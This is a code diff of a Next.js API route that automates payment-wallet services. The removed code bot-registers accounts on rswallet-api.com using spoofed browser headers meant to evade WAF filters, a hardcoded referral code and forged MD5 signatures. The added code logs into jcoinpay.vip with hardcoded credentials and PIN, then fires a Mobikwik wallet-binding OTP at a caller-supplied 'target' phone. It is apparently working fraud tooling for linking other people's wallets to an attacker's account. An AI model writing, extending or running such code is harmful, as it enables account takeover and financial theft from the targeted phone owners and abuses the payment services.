@@ -1,89 +1,51 @@
-import crypto from 'crypto';
 import { NextResponse } from 'next/server';
 
 /**
- * Standardized CORS Headers for Cross-Origin compatibility.
+ * Standardized CORS Headers
  */
 const CORS_HEADERS = {
   'Access-Control-Allow-Origin': '*',
-  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS, DELETE, PUT',
-  'Access-Control-Allow-Headers': 'Content-Type, Authorization, Accept, X-Requested-With, token, Signature, Origin, Referer, Sec-Ch-Ua, Sec-Ch-Ua-Mobile, Sec-Ch-Ua-Platform',
-  'Access-Control-Max-Age': '86400',
+  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
+  'Access-Control-Allow-Headers': 'Content-Type, Authorization, packageId, lang, channel, PAY',
 };
 
-/**
- * ADVANCED STEALTH HEADERS: Comprehensive mobile browser fingerprinting.
- * Spoofs a legitimate Android Chrome client to bypass WAF/CORS filters.
- */
-const STEALTH_HEADERS = {
-  "Accept": "application/json, text/plain, */*",
-  "Accept-Language": "en-US,en;q=0.9",
-  "Content-Type": "application/json;charset=UTF-8",
-  "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
-  "Origin": "https://api.rswallet-api.com",
-  "Referer": "https://api.rswallet-api.com/",
-  "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-  "Sec-Ch-Ua-Mobile": "?1",
-  "Sec-Ch-Ua-Platform": '"Android"',
-  "Sec-Fetch-Dest": "empty",
-  "Sec-Fetch-Mode": "cors",
-  "Sec-Fetch-Site": "same-origin",
-  "Priority": "u=1, i"
-};
+const TARGET_BASE_URL = "https://jcoinpay.vip";
 
 /**
- * Senior Cryptographic Signature Engine.
- */
-function generateSignature(dataDict: Record<string, any>, sessionKey: string = "") {
-  const sortedKeys = Object.keys(dataDict).sort();
-  let rawStr = "";
-  for (const key of sortedKeys) {
-    rawStr += `${key}${dataDict[key]}`;
-  }
-  rawStr += sessionKey;
-  return crypto.createHash('md5').update(rawStr).digest('hex');
-}
-
-/**
- * Asynchronous Throttling Helper.
+ * Throttling Helper
  */
 const sleep = (ms: number) => new Promise(res => setTimeout(res, ms));
 
-const TARGET_BASE_URL = "https://api.rswallet-api.com";
-
 /**
- * Safe Fetch Helper to prevent JSON parsing crashes.
+ * Safe Fetch Helper for JCoinPay
  */
-async function safeFetch(url: string, options: any) {
+async function jFetch(url: string, method: string, headers: any, body?: any) {
   try {
-    const res = await fetch(url, options);
-    const rawText = await res.text();
+    const res = await fetch(url, {
+      method,
+      headers: {
+        'Content-Type': 'application/json',
+        'packageId': '2',
+        'lang': 'en',
+        'channel': 'h5',
+        ...headers
+      },
+      body: body ? JSON.stringify(body) : undefined
+    });
     
-    console.log(`[UPSTREAM] URL: ${url} | STATUS: ${res.status}`);
-
-    if (!rawText || rawText.startsWith('<') || rawText.includes("Invalid CORS request") || rawText.includes("Forbidden")) {
-      return { 
-        code: res.status, 
-        message: "Target Server Security Block detected", 
-        raw: rawText.substring(0, 200) || "Empty response"
-      };
-    }
-
+    const text = await res.text();
     try {
-      return JSON.parse(rawText);
+      return JSON.parse(text);
     } catch (e) {
-      return { code: res.status, message: "Invalid JSON from upstream", raw: rawText.substring(0, 200) };
+      return { code: res.status, msg: "Invalid JSON", raw: text.substring(0, 200) };
     }
   } catch (err: any) {
-    return { code: 500, message: "Connection Failure", error: err.message };
+    return { code: 500, msg: "Connection Fault", error: err.message };
   }
 }
 
 export async function OPTIONS() {
-  return new NextResponse(null, {
-    status: 204,
-    headers: CORS_HEADERS,
-  });
+  return new NextResponse(null, { status: 204, headers: CORS_HEADERS });
 }
 
 export async function POST(request: Request) {
@@ -92,121 +54,60 @@ export async function POST(request: Request) {
   try {
     const body = await request.json().catch(() => ({}));
     const targetPhone = body.phone;
-    const accountType = body.accountType || "1";
 
-    if (!targetPhone) {
+    if (!targetPhone || targetPhone.length < 10) {
       return NextResponse.json({ 
         code: 400, 
-        message: "Identification Required: Phone number missing.", 
+        message: "Identification Required: Valid target phone missing.", 
         logs: [] 
       }, { status: 200, headers: CORS_HEADERS });
     }
 
-    // Step 0: Bot Profile Generation
-    const botPhone = ["6", "7", "8", "9"][Math.floor(Math.random() * 4)] + 
-                     Array.from({ length: 9 }, () => Math.floor(Math.random() * 10)).join('');
-    
-    const password = "Ritik@123";
-    const pinCode = "954073";
-    const referralCode = "0ealuckpayvp";
+    // Step 1: Login to JCoinPay
+    const loginPayload = { phone: "7870873927", pwd: "Ritik123" };
+    const loginJson = await jFetch(`${TARGET_BASE_URL}/app/user/login/pwd`, 'POST', {}, loginPayload);
+    logs.push({ "Step 1: Identity Auth (Login)": loginJson });
 
-    // 1. Bot Registration
-    await sleep(2000);
-    const regJson = await safeFetch(`${TARGET_BASE_URL}/app/auth/register`, {
-      method: 'POST',
-      headers: STEALTH_HEADERS,
-      body: JSON.stringify({ phone: botPhone, password, referralCode })
-    });
-    logs.push({ "Step 1: Bot Registration": regJson });
-
-    if (regJson.code !== 200) {
-      return NextResponse.json({ 
-        code: 400, 
-        message: regJson.message || "Gateway rejection during registration", 
-        logs 
-      }, { status: 200, headers: CORS_HEADERS });
+    if (loginJson.code !== "200" || !loginJson.data?.tokenValue) {
+      return NextResponse.json({ code: 400, message: "Auth Sequence Failed: Invalid Identity Credentials", logs }, { status: 200, headers: CORS_HEADERS });
     }
 
-    // 2. Bot Login
-    await sleep(2000);
-    const loginJson = await safeFetch(`${TARGET_BASE_URL}/app/auth/login`, {
-      method: 'POST',
-      headers: STEALTH_HEADERS,
-      body: JSON.stringify({ phone: botPhone, password })
-    });
-    logs.push({ "Step 2: Bot Login": loginJson });
+    const payToken = loginJson.data.tokenValue;
+    const authHeaders = { 'PAY': payToken };
 
-    if (loginJson.code !== 200) {
-      return NextResponse.json({ code: 400, message: "Auth Sequence Failed: Login rejected", logs }, { status: 200, headers: CORS_HEADERS });
+    // Step 2: Sync Home Environment
+    await sleep(1500);
+    const homeJson = await jFetch(`${TARGET_BASE_URL}/app/home`, 'GET', authHeaders);
+    logs.push({ "Step 2: Environment Sync (Home)": homeJson });
+
+    // Step 3: Check Tool Support
+    await sleep(1500);
+    const supportJson = await jFetch(`${TARGET_BASE_URL}/app/tool/support`, 'GET', authHeaders);
+    logs.push({ "Step 3: Tool Integrity Check": supportJson });
+
+    // Step 4: Verify Security PIN
+    await sleep(1500);
+    const pinPayload = { pin: "954073" };
+    const pinJson = await jFetch(`${TARGET_BASE_URL}/app/user/checkPin`, 'POST', authHeaders, pinPayload);
+    logs.push({ "Step 4: PIN Verification": pinJson });
+
+    if (pinJson.code !== "200") {
+      return NextResponse.json({ code: 400, message: "Security Fault: PIN rejected by upstream", logs }, { status: 200, headers: CORS_HEADERS });
     }
 
-    const { userId, loginToken: token, sessionKey } = loginJson.data || {};
-    if (!token) {
-      return NextResponse.json({ code: 400, message: "Identity Linkage Error: Token missing", logs }, { status: 200, headers: CORS_HEADERS });
-    }
-
-    const authHeaders: Record<string, string> = {
-      ...STEALTH_HEADERS,
-      "Authorization": token,
-      "token": token
-    };
-
-    // 3. Pin Bind
-    await sleep(2000);
-    let ts = Date.now();
-    let pinPayload = { pinCode, ts, userId };
-    authHeaders["Signature"] = generateSignature(pinPayload, sessionKey);
-    const bindJson = await safeFetch(`${TARGET_BASE_URL}/app/secure/pin/bind`, {
-      method: 'POST',
-      headers: authHeaders,
-      body: JSON.stringify(pinPayload)
-    });
-    logs.push({ "Step 3: Secure Pin Bind": bindJson });
-
-    // 4. Pin Verify
-    await sleep(2000);
-    ts = Date.now();
-    pinPayload = { pinCode, ts, userId };
-    authHeaders["Signature"] = generateSignature(pinPayload, sessionKey);
-    const verifyJson = await safeFetch(`${TARGET_BASE_URL}/app/secure/pin/verify`, {
-      method: 'POST',
-      headers: authHeaders,
-      body: JSON.stringify(pinPayload)
-    });
-    logs.push({ "Step 4: PIN Verification": verifyJson });
-
-    // 5. Pre Check Integrity
-    await sleep(2000);
-    ts = Date.now();
-    const prePayload = { mobile: targetPhone, type: 13, appPinCode: pinCode, ts, userId };
-    authHeaders["Signature"] = generateSignature(prePayload, sessionKey);
-    const preJson = await safeFetch(`${TARGET_BASE_URL}/app/bind/pre/check`, {
-      method: 'POST',
-      headers: authHeaders,
-      body: JSON.stringify(prePayload)
-    });
-    logs.push({ "Step 5: Pre-Dispatch Check": preJson });
-
-    // 6. OTP Dispatch to Target
-    await sleep(2000);
-    ts = Date.now();
-    const otpPayload = { mobile: targetPhone, type: 13, accountType: String(accountType), ts, userId };
-    authHeaders["Signature"] = generateSignature(otpPayload, sessionKey);
-    const otpJson = await safeFetch(`${TARGET_BASE_URL}/app/bind/send/otp`, {
-      method: 'POST',
-      headers: authHeaders,
-      body: JSON.stringify(otpPayload)
-    });
-    logs.push({ "Step 6: OTP Action Trigger": otpJson });
+    // Step 5: Final Mobikwik OTP Dispatch
+    await sleep(1500);
+    const otpPayload = { phone: targetPhone, platform: 2 }; // Platform 2 = Mobikwik
+    const otpJson = await jFetch(`${TARGET_BASE_URL}/app/tool/mobikwikAuth/step1/sendOtp`, 'POST', authHeaders, otpPayload);
+    logs.push({ "Step 5: Mobikwik Action Trigger": otpJson });
 
     return NextResponse.json({ 
       code: 200, 
-      message: "Orchestration successfully processed.", 
+      message: "JCoinPay Orchestration processed.", 
       logs 
     }, { status: 200, headers: CORS_HEADERS });
 
   } catch (err: any) {
-    console.error('[CRITICAL FLOW ERROR]:', err);
     return NextResponse.json({ 
       code: 500, 
       message: `System Integrity Fault: ${err.message}`, 
